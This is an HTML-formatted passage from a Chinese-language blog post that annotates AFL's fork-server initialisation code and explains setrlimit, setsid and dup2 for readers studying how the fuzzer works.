class="function">EXP_ST <span class="keyword">void</span> <span class="title">init_forkserver</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">itimerval</span> <span class="title">it</span>;</span></span><br><span class="line">  <span class="keyword">int</span> st_pipe[<span class="number">2</span>], ctl_pipe[<span class="number">2</span>];  <span class="comment">// st_pipe: 状态管道，用于从子进程接收状态; ctl_pipe: 控制管道，用于向子进程发送命令</span></span><br><span class="line">  <span class="keyword">int</span> status;</span><br><span class="line">  s32 rlen;</span><br><span class="line"></span><br><span class="line">  ACTF(<span class="string">&quot;Spinning up the fork server...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建两个管道用于父子进程间通信</span></span><br><span class="line">  <span class="keyword">if</span> (pipe(st_pipe) || pipe(ctl_pipe))</span><br><span class="line">    PFATAL(<span class="string">&quot;pipe() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建fork server进程</span></span><br><span class="line">  forksrv_pid = fork();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (forksrv_pid &lt; <span class="number">0</span>)</span><br><span class="line">    PFATAL(<span class="string">&quot;fork() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ========== 子进程（fork server）部分 ==========</span></span><br><span class="line">  <span class="keyword">if</span> (!forksrv_pid) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Umpf. On OpenBSD, the default fd limit for root users is set to</span></span><br><span class="line"><span class="comment">       soft 128. Let&#x27;s try to fix that... */</span></span><br><span class="line">    <span class="comment">// 修复OpenBSD上root用户文件描述符限制过低的问题</span></span><br><span class="line">    <span class="keyword">if</span> (!getrlimit(RLIMIT_NOFILE, &amp;r) &amp;&amp; r.rlim_cur &lt; FORKSRV_FD + <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">      r.rlim_cur = FORKSRV_FD + <span class="number">2</span>;</span><br><span class="line">      setrlimit(RLIMIT_NOFILE, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置内存限制（如果指定了的话）</span></span><br><span class="line">    <span class="keyword">if</span> (mem_limit) &#123;</span><br><span class="line"></span><br><span class="line">      r.rlim_max = r.rlim_cur = ((<span class="keyword">rlim_t</span>)mem_limit) &lt;&lt; <span class="number">20</span>;  <span class="comment">// 将MB转换为字节</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RLIMIT_AS</span></span><br><span class="line"></span><br><span class="line">      setrlimit(RLIMIT_AS, &amp;r); <span class="comment">/* Ignore errors */</span>  <span class="comment">// 设置虚拟内存限制</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* This takes care of OpenBSD, which doesn&#x27;t have RLIMIT_AS, but</span></span><br><span class="line"><span class="comment">         according to reliable sources, RLIMIT_DATA covers anonymous</span></span><br><span class="line"><span class="comment">         maps - so we should be getting good protection against OOM bugs. */</span></span><br><span class="line">      <span class="comment">// OpenBSD没有RLIMIT_AS，使用RLIMIT_DATA代替</span></span><br><span class="line">      setrlimit(RLIMIT_DATA, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^RLIMIT_AS */</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Dumping cores is slow and can lead to anomalies if SIGKILL is delivered</span></span><br><span class="line"><span class="comment">       before the dump is complete. */</span></span><br><span class="line">    <span class="comment">// 禁用core dump，避免因为dump过程被中断导致的异常</span></span><br><span class="line">    r.rlim_max = r.rlim_cur = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    setrlimit(RLIMIT_CORE, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Isolate the process and configure standard descriptors. If out_file is</span></span><br><span class="line"><span class="comment">       specified, stdin is /dev/null; otherwise, out_fd is cloned instead. */</span></span><br><span class="line">    <span class="comment">// 创建新会话，隔离进程</span></span><br><span class="line">    setsid();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将stdout和stderr重定向到/dev/null</span></span><br><span class="line">    dup2(dev_null_fd, <span class="number">1</span>);</span><br><span class="line">    dup2(dev_null_fd, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 配置stdin：如果指定了输出文件，stdin从/dev/null读取；否则从out_fd读取</span></span><br><span class="line">    <span class="keyword">if</span> (out_file) &#123;</span><br><span class="line"></span><br><span class="line">      dup2(dev_null_fd, <span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">      dup2(out_fd, <span class="number">0</span>);</span><br><span class="line">      close(out_fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set up control and status pipes, close the unneeded original fds. */</span></span><br><span class="line">    <span class="comment">// 设置控制和状态管道的文件描述符到固定位置（FORKSRV_FD和FORKSRV_FD+1）</span></span><br><span class="line">    <span class="keyword">if</span> (dup2(ctl_pipe[<span class="number">0</span>], FORKSRV_FD) &lt; <span class="number">0</span>)      <span class="comment">// 控制管道读端 -&gt; FORKSRV_FD</span></span><br><span class="line">      PFATAL(<span class="string">&quot;dup2() failed&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (dup2(st_pipe[<span class="number">1</span>], FORKSRV_FD + <span class="number">1</span>) &lt; <span class="number">0</span>)   <span class="comment">// 状态管道写端 -&gt; FORKSRV_FD+1</span></span><br><span class="line">      PFATAL(<span class="string">&quot;dup2() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭不需要的管道端点</span></span><br><span class="line">    close(ctl_pipe[<span class="number">0</span>]);</span><br><span class="line">    close(ctl_pipe[<span class="number">1</span>]);</span><br><span class="line">    close(st_pipe[<span class="number">0</span>]);</span><br><span class="line">    close(st_pipe[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭其他不需要的文件描述符</span></span><br><span class="line">    close(out_dir_fd);</span><br><span class="line">    close(dev_null_fd);</span><br><span class="line">    close(dev_urandom_fd);</span><br><span class="line">    close(fileno(plot_file));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This should improve performance a bit, since it stops the linker from</span></span><br><span class="line"><span class="comment">       doing extra work post-fork(). */</span></span><br><span class="line">    <span class="comment">// 设置LD_BIND_NOW环境变量，让动态链接器立即解析所有符号，避免fork后的额外工作</span></span><br><span class="line">    <span class="keyword">if</span> (!getenv(<span class="string">&quot;LD_BIND_LAZY&quot;</span>))</span><br><span class="line">      setenv(<span class="string">&quot;LD_BIND_NOW&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set sane defaults for ASAN if nothing else specified. */</span></span><br><span class="line">    <span class="comment">// 为AddressSanitizer设置合理的默认选项</span></span><br><span class="line">    setenv(<span class="string">&quot;ASAN_OPTIONS&quot;</span>,</span><br><span class="line">           <span class="string">&quot;abort_on_error=1:&quot;</span>           <span class="comment">// 遇到错误立即中止</span></span><br><span class="line">           <span class="string">&quot;detect_leaks=0:&quot;</span>              <span class="comment">// 禁用内存泄漏检测</span></span><br><span class="line">           <span class="string">&quot;symbolize=0:&quot;</span>                 <span class="comment">// 禁用符号化（提高性能）</span></span><br><span class="line">           <span class="string">&quot;allocator_may_return_null=1&quot;</span>, <span class="comment">// 允许分配器返回NULL</span></span><br><span class="line">           <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* MSAN is tricky, because it doesn&#x27;t support abort_on_error=1 at this</span></span><br><span class="line"><span class="comment">       point. So, we do this in a very hacky way. */</span></span><br><span class="line">    <span class="comment">// 为MemorySanitizer设置选项（MSAN不支持abort_on_error，所以用exit_code替代）</span></span><br><span class="line">    setenv(<span class="string">&quot;MSAN_OPTIONS&quot;</span>,</span><br><span class="line">           <span class="string">&quot;exit_code=&quot;</span> STRINGIFY(MSAN_ERROR) <span class="string">&quot;:&quot;</span>  <span class="comment">// 设置特定的退出码</span></span><br><span class="line">                                              <span class="string">&quot;symbolize=0:&quot;</span></span><br><span class="line">                                              <span class="string">&quot;abort_on_error=1:&quot;</span></span><br><span class="line">                                              <span class="string">&quot;allocator_may_return_null=1:&quot;</span></span><br><span class="line">                                              <span class="string">&quot;msan_track_origins=0&quot;</span>,  <span class="comment">// 不追踪未初始化内存的来源</span></span><br><span class="line">           <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行目标程序</span></span><br><span class="line">    execv(target_path, argv);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Use a distinctive bitmap signature to tell the parent about execv()</span></span><br><span class="line"><span class="comment">       falling through. */</span></span><br><span class="line">    <span class="comment">// 如果execv失败（正常情况下不会到这里），在共享内存中写入特殊标记</span></span><br><span class="line">    *(u32 *)trace_bits = EXEC_FAIL_SIG;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ========== 父进程（fuzzer主进程）部分 ==========</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Close the unneeded endpoints. */</span></span><br><span class="line">  <span class="comment">// 关闭不需要的管道端点（父进程只需要写控制管道和读状态管道）</span></span><br><span class="line">  close(ctl_pipe[<span class="number">0</span>]);  <span class="comment">// 关闭控制管道读端</span></span><br><span class="line">  close(st_pipe[<span class="number">1</span>]);   <span class="comment">// 关闭状态管道写端</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 保存需要使用的管道文件描述符</span></span><br><span class="line">  fsrv_ctl_fd = ctl_pipe[<span class="number">1</span>];  <span class="comment">// 控制管道写端</span></span><br><span class="line">  fsrv_st_fd = st_pipe[<span class="number">0</span>];     <span class="comment">// 状态管道读端</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Wait for the fork server to come up, but don&#x27;t wait too long. */</span></span><br><span class="line">  <span class="comment">// 设置定时器，等待fork server启动，但不要等太久</span></span><br><span class="line">  it.it_value.tv_sec = ((exec_tmout * FORK_WAIT_MULT) / <span class="number">1000</span>);</span><br><span class="line">  it.it_value.tv_usec = ((exec_tmout * FORK_WAIT_MULT) % <span class="number">1000</span>) * <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">  setitimer(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 尝试从fork server读取4字节的&quot;hello&quot;消息</span></span><br><span class="line">  rlen = read(fsrv_st_fd, &amp;status, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 取消定时器</span></span><br><span class="line">  it.it_value.tv_sec = <span class="number">0</span>;</span><br><span class="line">  it.it_value.tv_usec = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  setitimer(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we have a four-byte &quot;hello&quot; message from the server, we&#x27;re all set.</span></span><br><span class="line"><span class="comment">     Otherwise, try to figure out what went wrong. */</span></span><br><span class="line">  <span class="comment">// 如果成功接收到4字节消息，说明fork server已经准备好</span></span><br><span class="line">  <span class="keyword">if</span> (rlen == <span class="number">4</span>) &#123;</span><br><span class="line">    OKF(<span class="string">&quot;All right - fork server is up.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ========== 错误处理部分 ==========</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 如果超时</span></span><br><span class="line">  <span class="keyword">if</span> (child_timed_out)</span><br><span class="line">    FATAL(<span class="string">&quot;Timeout while initializing fork server (adjusting -t may help)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 等待子进程结束并获取状态</span></span><br><span class="line">  <span class="keyword">if</span> (waitpid(forksrv_pid, &amp;status, <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    PFATAL(<span class="string">&quot;waitpid() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果子进程被信号终止</span></span><br><span class="line">  <span class="keyword">if</span> (WIFSIGNALED(status)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据不同情况输出不同的错误提示</span></span><br><span class="line">    <span class="keyword">if</span> (mem_limit &amp;&amp; mem_limit &lt; <span class="number">500</span> &amp;&amp; uses_asan) &#123;</span><br><span class="line">      <span class="comment">// 内存限制太低且使用ASAN的情况</span></span><br><span class="line">      SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST <span class="string">&quot;Whoops, the target binary crashed suddenly, &quot;</span></span><br><span class="line">           <span class="string">&quot;before receiving any input\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    from the fuzzer! Since it seems to be built with ASAN and you &quot;</span></span><br><span class="line">           <span class="string">&quot;have a\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    restrictive memory limit configured, this is expected; please &quot;</span></span><br><span class="line">           <span class="string">&quot;read\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    %s/notes_for_asan.txt for help.\n&quot;</span>,</span><br><span class="line">           doc_path);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mem_limit) &#123;</span><br><span class="line">      <span class="comment">// 没有设置内存限制的情况</span></span><br><span class="line">      SAYF(</span><br><span class="line">          <span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST <span class="string">&quot;Whoops, the target binary crashed suddenly, &quot;</span></span><br><span class="line">          <span class="string">&quot;before receiving any input\n&quot;</span></span><br><span class="line">          <span class="string">&quot;    from the fuzzer! There are several probable explanations:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">          <span class="string">&quot;    - The binary is just buggy and explodes entirely on its own. If &quot;</span></span><br><span class="line">          <span class="string">&quot;so, you\n&quot;</span></span><br><span class="line">          <span class="string">&quot;      need to fix the underlying problem or find a better &quot;</span></span><br><span class="line">          <span class="string">&quot;replacement.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line">          <span class="comment">// MacOS特殊说明</span></span><br><span class="line">          <span class="string">&quot;    - On MacOS X, the semantics of fork() syscalls are non-standard &quot;</span></span><br><span class="line">          <span class="string">&quot;and may\n&quot;</span></span><br><span class="line">          <span class="string">&quot;      break afl-fuzz performance optimizations when running &quot;</span></span><br><span class="line">          <span class="string">&quot;platform-specific\n&quot;</span></span><br><span class="line">          <span class="string">&quot;      targets. To fix this, set AFL_NO_FORKSRV=1 in the &quot;</span></span><br><span class="line">          <span class="string">&quot;environment.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">          <span class="string">&quot;    - Less likely, there is a horrible bug in the fuzzer. If other &quot;</span></span><br><span class="line">          <span class="string">&quot;options\n&quot;</span></span><br><span class="line">          <span class="string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 设置了内存限制的情况</span></span><br><span class="line">      SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST <span class="string">&quot;Whoops, the target binary crashed suddenly, &quot;</span></span><br><span class="line">           <span class="string">&quot;before receiving any input\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    from the fuzzer! There are several probable explanations:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">           <span class="string">&quot;    - The current memory limit (%s) is too restrictive, causing &quot;</span></span><br><span class="line">           <span class="string">&quot;the\n&quot;</span></span><br><span class="line">           <span class="string">&quot;      target to hit an OOM condition in the dynamic linker. Try &quot;</span></span><br><span class="line">           <span class="string">&quot;bumping up\n&quot;</span></span><br><span class="line">           <span class="string">&quot;      the limit with the -m setting in the command line. A simple &quot;</span></span><br><span class="line">           <span class="string">&quot;way confirm\n&quot;</span></span><br><span class="line">           <span class="string">&quot;      this diagnosis would be:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RLIMIT_AS</span></span><br><span class="line">           <span class="string">&quot;      ( ulimit -Sv $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">           <span class="string">&quot;      ( ulimit -Sd $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^RLIMIT_AS */</span></span></span><br><span class="line"></span><br><span class="line">           <span class="string">&quot;      Tip: you can use http://jwilk.net/software/recidivm to &quot;</span></span><br><span class="line">           <span class="string">&quot;quickly\n&quot;</span></span><br><span class="line">           <span class="string">&quot;      estimate the required amount of virtual memory for the &quot;</span></span><br><span class="line">           <span class="string">&quot;binary.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">           <span class="string">&quot;    - The binary is just buggy and explodes entirely on its own. &quot;</span></span><br><span class="line">           <span class="string">&quot;If so, you\n&quot;</span></span><br><span class="line">           <span class="string">&quot;      need to fix the underlying problem or find a better &quot;</span></span><br><span class="line">           <span class="string">&quot;replacement.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line">           <span class="comment">// MacOS特殊说明</span></span><br><span class="line">           <span class="string">&quot;    - On MacOS X, the semantics of fork() syscalls are &quot;</span></span><br><span class="line">           <span class="string">&quot;non-standard and may\n&quot;</span></span><br><span class="line">           <span class="string">&quot;      break afl-fuzz performance optimizations when running &quot;</span></span><br><span class="line">           <span class="string">&quot;platform-specific\n&quot;</span></span><br><span class="line">           <span class="string">&quot;      targets. To fix this, set AFL_NO_FORKSRV=1 in the &quot;</span></span><br><span class="line">           <span class="string">&quot;environment.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">           <span class="string">&quot;    - Less likely, there is a horrible bug in the fuzzer. If other &quot;</span></span><br><span class="line">           <span class="string">&quot;options\n&quot;</span></span><br><span class="line">           <span class="string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>,</span><br><span class="line">           DMS(mem_limit &lt;&lt; <span class="number">20</span>), mem_limit - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FATAL(<span class="string">&quot;Fork server crashed with signal %d&quot;</span>, WTERMSIG(status));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查是否是execv失败（通过共享内存中的特殊标记判断）</span></span><br><span class="line">  <span class="keyword">if</span> (*(u32 *)trace_bits == EXEC_FAIL_SIG)</span><br><span class="line">    FATAL(<span class="string">&quot;Unable to execute target application (&#x27;%s&#x27;)&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 处理fork server握手失败的情况</span></span><br><span class="line">  <span class="keyword">if</span> (mem_limit &amp;&amp; mem_limit &lt; <span class="number">500</span> &amp;&amp; uses_asan) &#123;</span><br><span class="line">    <span class="comment">// 内存限制太低且使用ASAN</span></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST <span class="string">&quot;Hmm, looks like the target binary terminated &quot;</span></span><br><span class="line">         <span class="string">&quot;before we could complete a\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    handshake with the injected code. Since it seems to be built &quot;</span></span><br><span class="line">         <span class="string">&quot;with ASAN and\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    you have a restrictive memory limit configured, this is &quot;</span></span><br><span class="line">         <span class="string">&quot;expected; please\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    read %s/notes_for_asan.txt for help.\n&quot;</span>,</span><br><span class="line">         doc_path);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mem_limit) &#123;</span><br><span class="line">    <span class="comment">// 没有内存限制</span></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST <span class="string">&quot;Hmm, looks like the target binary terminated &quot;</span></span><br><span class="line">         <span class="string">&quot;before we could complete a\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    handshake with the injected code. Perhaps there is a horrible &quot;</span></span><br><span class="line">         <span class="string">&quot;bug in the\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    fuzzer. Poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 有内存限制的通用情况</span></span><br><span class="line">    SAYF(</span><br><span class="line">        <span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST <span class="string">&quot;Hmm, looks like the target binary terminated &quot;</span></span><br><span class="line">        <span class="string">&quot;before we could complete a\n&quot;</span></span><br><span class="line">        <span class="string">&quot;    handshake with the injected code. There are %s probable &quot;</span></span><br><span class="line">        <span class="string">&quot;explanations:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;%s&quot;</span>  <span class="comment">// 如果使用了延迟fork server，会插入额外的说明</span></span><br><span class="line">        <span class="string">&quot;    - The current memory limit (%s) is too restrictive, causing an &quot;</span></span><br><span class="line">        <span class="string">&quot;OOM\n&quot;</span></span><br><span class="line">        <span class="string">&quot;      fault in the dynamic linker. This can be fixed with the -m &quot;</span></span><br><span class="line">        <span class="string">&quot;option. A\n&quot;</span></span><br><span class="line">        <span class="string">&quot;      simple way to confirm the diagnosis may be:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RLIMIT_AS</span></span><br><span class="line">        <span class="string">&quot;      ( ulimit -Sv $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">        <span class="string">&quot;      ( ulimit -Sd $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^RLIMIT_AS */</span></span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;      Tip: you can use http://jwilk.net/software/recidivm to quickly\n&quot;</span></span><br><span class="line">        <span class="string">&quot;      estimate the required amount of virtual memory for the &quot;</span></span><br><span class="line">        <span class="string">&quot;binary.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;    - Less likely, there is a horrible bug in the fuzzer. If other &quot;</span></span><br><span class="line">        <span class="string">&quot;options\n&quot;</span></span><br><span class="line">        <span class="string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>,</span><br><span class="line">        getenv(DEFER_ENV_VAR) ? <span class="string">&quot;three&quot;</span> : <span class="string">&quot;two&quot;</span>,  <span class="comment">// 根据是否使用延迟fork server决定说&quot;两个&quot;还是&quot;三个&quot;原因</span></span><br><span class="line">        getenv(DEFER_ENV_VAR)</span><br><span class="line">            ? <span class="string">&quot;    - You are using deferred forkserver, but __AFL_INIT() is &quot;</span></span><br><span class="line">              <span class="string">&quot;never\n&quot;</span></span><br><span class="line">              <span class="string">&quot;      reached before the program terminates.\n\n&quot;</span></span><br><span class="line">            : <span class="string">&quot;&quot;</span>,</span><br><span class="line">        DMS(mem_limit &lt;&lt; <span class="number">20</span>), mem_limit - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  FATAL(<span class="string">&quot;Fork server handshake failed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里先是创建了子进程，如果想在clion中调试子进程的话需要在gdb窗口输入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> follow-fork-mode child</span><br><span class="line"><span class="built_in">set</span> detach-on-fork off</span><br></pre></td></tr></table></figure><p>我们先看看子进程，先做了一些对应不同情况的设置，这里注意到反复使用了setrlimit</p><h5 id="setrlimit"><a href="#setrlimit" class="headerlink" title="setrlimit"></a>setrlimit</h5><p>这个函数主要是为一个进程（process）或其子进程可以消耗的系统资源设置限制（limits），允许你控制一个进程能使用多少CPU时间、能创建多大的文件、能占用多少内存等，以防止单个进程因编程错误（如无限循环、内存泄漏）或恶意行为耗尽整个系统的资源，从而保证系统的稳定性和安全性。</p><p>这里就利用这个函数做了控制OpenBSD上root用户文件描述符限制过低的问题，设置虚拟内存限制，禁用core dump，避免因为dump过程被中断导致的异常</p><p>接下来我们看到了一个新的函数</p><h5 id="setsid"><a href="#setsid" class="headerlink" title="setsid"></a>setsid</h5><p>调用这个函数使得新的子进程加入一个全新的进程组。向父进程所在进程组发送的信号（例如 <code>kill -TERM -&lt;PGID&gt;</code>）不会影响到这个新进程组。</p><p>这里还调用了几个dup2</p><h5 id="dup2"><a href="#dup2" class="headerlink" title="dup2"></a>dup2</h5><h6 id="标准输出和标准错误的重定向"><a href="#标准输出和标准错误的重定向" class="headerlink" title="标准输出和标准错误的重定向"></a>标准输出和标准错误的重定向</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">dup2(dev_null_fd, <span class="number">1</span>);</span><br><span class="line">dup2(dev_null_fd, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><ul><li><strong>功能</strong>：将标准输出（文件描述符 1）和标准错误（文件描述符 2）重定向到 <code>/dev/null</code></li><li><strong>目的</strong>：<ul><li>确保守护进程的任何输出都不会显示在终端上</li><li>防止向可能已关闭的终端写入数据导致进程收到 <code>SIGPIPE</code> 信号而崩溃</li><li>丢弃所有不必要的输出，避免产生无用的日志文件</li></ul></li></ul><h6 id="标准输入的重定向"><a href="#标准输入的重定向" class="headerlink" title="标准输入的重定向"></a>标准输入的重定向</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (out_file) &#123;</span><br><span class="line">  dup2(dev_null_fd, <span class="number">0</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  dup2(out_fd, <span class="number">0</span>);</span><br><span class="line">  close(out_fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>功能</strong>：根据是否指定了输出文件，选择不同的方式重定向标准输入（文件描述符 0）</li><li><strong>目的</strong>：<ul><li>如果指定了输出文件（<code>out_file</code>），将标准输入重定向到 <code>/dev/null</code>，表示进程不需要任何输入</li><li>如果没有指定输出文件，将标准输入重定向到 <code>out_fd</code>(setup_stdio_file中赋值的)，然后关闭原始的 <code>out_fd</code></li></ul></li></ul><h6 id="控制管道和状态管道的重定向"><a href="#控制管道和状态管道的重定向" class="headerlink" title="控制管道和状态管道的重定向"></a>控制管道和状态管道的重定向</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (dup2(ctl_pipe[<span class="number">0</span>], FORKSRV_FD) &lt; <span class="number">0</span>)</span><br><span class="line">  PFATAL(<span class="string">&quot;dup2() failed&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (dup2(st_pipe[<span class="number">1</span>], FORKSRV_FD + <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">  PFATAL(<span class="string">&quot;dup2() failed&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li><strong>功能</strong>：将控制管道的读端和状态管道的写端重定向到预定义的文件描述符位置，也就是子进程中会写死一个FORKSRV_FD来和父进程进行通信，读取命令或者返回状态</li><li><strong>目的</strong>：<ul><li>将控制管道的读端（<code>ctl_pipe[0]</code>）复制到固定的文件描述符 <code>FORKSRV_FD</code></li><li>将状态管道的写端（<code>st_pipe[1]</code>）复制到固定的文件描述符 <code>FORKSRV_FD + 1</code></li><li>这样做是为了让后续通过 <code>execv</code> 执行的子进程能够通过固定的文件描述符与父进程通信，而不需要知道原始的管道文件描述符</li></ul></li></ul><p>然后子进程就会调用被测程序，并通过管道向一开始的父进程发送信息，并接受父进程控制，最后如果从子进程中获取到4字节内容则表示 ，说明fork server已经准备好</p><p>然后接着回看上级函数calibrate_case </p><p>这里再检查校验和是否存在，若存在则保存当前跟踪位图并检查新位这里调用了has_new_bits</p><h4 id="has-new-bits"><a href="#has-new-bits" class="headerlink" title="has_new_bits"></a>has_new_bits</h4><p>这里我先说一下这里出现的位图的表达方式：</p><p> <strong>在 virgin_bits 中：字节的值 = 覆盖状态</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">virgin_bits[<span class="number">1000</span>] = <span class="number">0xFF</span>; <span class="comment">// 11111111 - 完全未覆盖</span></span><br><span class="line">virgin_bits[<span 